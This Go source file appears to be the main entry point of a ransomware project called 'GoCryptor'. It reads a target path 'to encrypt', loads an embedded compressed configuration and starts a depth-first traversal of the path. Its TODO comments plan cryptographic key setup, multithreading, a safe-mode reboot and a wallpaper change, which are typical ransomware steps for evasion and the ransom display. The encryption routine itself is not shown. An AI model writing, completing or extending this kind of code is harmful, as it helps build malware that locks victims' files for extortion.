package main

import (
	"flag"
	"fmt"
)

var args []string
var GoCryptorConfig Configuration

func main() {
	targetPathPtr := flag.String("path", "", "A target path to encrypt")
	//safemodeFlagPtr := flag.Bool("safe", false, "Safemode reboot")
	flag.Parse()

	decompressedConfig, _ := decompress(CompressedConfig)
	GoCryptorConfig, _ = parseConfig(decompressedConfig)

	fmt.Println(GoCryptorConfig)
	if *targetPathPtr != "" {
		DFSTraverseSingle(*targetPathPtr)
	}
}

// Things to do:
// - Command line arguments
// 		- path:
// 		- safemode reboot
//      - wallpaper
// Pre-Encryption:
// - Cryptographic Keys Setup
// - Multithreading

// things to do last
// - Safemood Reboot
// - wallpaper
